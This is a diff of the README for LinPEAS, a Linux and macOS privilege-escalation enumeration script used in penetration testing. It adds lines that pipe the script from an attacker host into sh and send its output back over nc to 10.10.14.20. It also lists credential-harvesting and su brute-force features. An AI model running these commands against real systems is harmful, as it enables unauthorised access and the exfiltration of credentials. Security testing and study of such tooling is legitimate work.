@@ -1,4 +1,5 @@
 # LinPEAS - Linux Privilege Escalation Awesome Script 
+[![CI-linpeas_prod](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/actions/workflows/CI-linpeas_prod.yml/badge.svg)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/actions/workflows/CI-linpeas_prod.yml)
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)
 
@@ -17,17 +18,21 @@ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
 
 ```bash
 #Local network
-sudo python -m SimpleHTTPServer 80
-curl 10.10.10.10/linpeas.sh | sh
+sudo python -m SimpleHTTPServer 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
 
 #Without curl
-sudo nc -q 5 -lvnp 80 < linpeas.sh
-cat < /dev/tcp/10.10.10.10/80 | sh
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
+#Excute from memory and send output back to the host
+nc -lvnp 9002 | tee linpeas.out #Host
+curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
 ```
 
 ```bash
 #Output to file
-linpeas -a > /dev/shm/linpeas.txt
+./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
 less -r /dev/shm/linpeas.txt #Read with colors
 ```
 
@@ -44,7 +49,9 @@ sudo python -m SimpleHTTPServer 80 #Start HTTP server
 curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
-**Use the parameter `-a` to execute all these checks.**
+## MacPEAS
+
+Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed!!**
 
 ## Basic Information
 
@@ -66,10 +73,11 @@ By default linpeas takes around **2 mins** to complete, but It could take from *
 - **-a** (all checks) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**
 - **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
 - **-P** (Password) - Pass a password that will be used with `sudo -l` and bruteforcing other users
+- **-v** (verbose) - Print information about the checks that haven't discovered anything and about the time each check took
 
 This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
 
-LinPEAS also **exports a new PATH** variable during the execution if common folders aren't present in the original PATH variable. It also **exports and unset** some environmental variables during the execution so no command executed during the session will be saved in the history file (you can avoid this actions using the parameter **-n**).
+LinPEAS also **exports a new PATH** variable during the execution if common folders aren't present in the original PATH variable.
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/help.png)
 
@@ -138,9 +146,9 @@ Here you have an old linpe version script in one line, **just copy and paste it*
 
 **The color filtering is not available in the one-liner** (the lists are too big)
 
-This one-liner is deprecated (I am not going to update it more), but it could be useful in some cases so it will remain here:
+This one-liner is deprecated (I'm not going to update it any more), but it could be useful in some cases so it will remain here.
 
-The default file where all the data is recorded is: */tmp/linPE* (you can change it at the beginning of the script)
+The default file where all the data is stored is: */tmp/linPE* (you can change it at the beginning of the script)
 
 
 ```sh
@@ -153,6 +161,7 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
 - **System Information**
   - [x] SO & kernel version 
   - [x] Sudo version
+  - [x] USBCreator PE
   - [x] PATH
   - [x] Date
   - [x] System stats
@@ -208,6 +217,8 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Apache (Version)
   - [x] PHP cookies
   - [x] Wordpress (Database credentials)
+  - [x] Drupal (Database credentials)
+  - [x] Moodle (Database credentials)
   - [x] Tomcat (Credentials)
   - [x] Mongo (Version, Credentials)
   - [x] Supervisor (Credentials)
@@ -239,7 +250,23 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [X] GVM config
   - [x] IPSEC files
   - [x] IRSSI config file
-
+  - [x] Keyring files
+  - [x] Filelliza files
+  - [x] Backup-manager
+  - [x] Splunk
+  - [x] Gitlab
+  - [x] PGP/GPG files
+  - [x] Vim swp files
+  - [x] ctr
+  - [x] runc
+  - [x] Firefox user files
+  - [x] Google Chrome user files
+  - [x] Autologin files
+  - [x] S/Key
+  - [x] YubiKey
+  - [x] Passwords inside pam.d
+  - [x] FastCGI params
+  - [x] SNMPD
 
 - **Generic Interesting Files**
   - [x] SUID & SGID files
@@ -284,18 +311,17 @@ If you want to **add something** and have **any cool idea** related to this proj
 
 ## Please, if this tool has been useful for you consider to donate
 
-[![Buy me a coffee](https://camo.githubusercontent.com/031fc5a134cdca5ae3460822aba371e63f794233/68747470733a2f2f7777772e6275796d6561636f666665652e636f6d2f6173736574732f696d672f637573746f6d5f696d616765732f6f72616e67655f696d672e706e67)](https://www.buymeacoffee.com/carlospolop)
+[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.patreon.com/peass)
 
-## Looking for a useful Privilege Escalation Course?
+## PEASS Style
 
-Contact me and ask about the **Privilege Escalation Course** I am preparing for attackers and defenders (**100% technical**).
+Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas
 
 ## TODO
 
 - Add more checks
 - Mantain updated the list of vulnerable SUID binaries
 - Mantain updated all the blacklists used to color the output
-- Support for MacOS
 
 If you want to help with any of this, you can do it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues) or you can submit a pull request**.
 
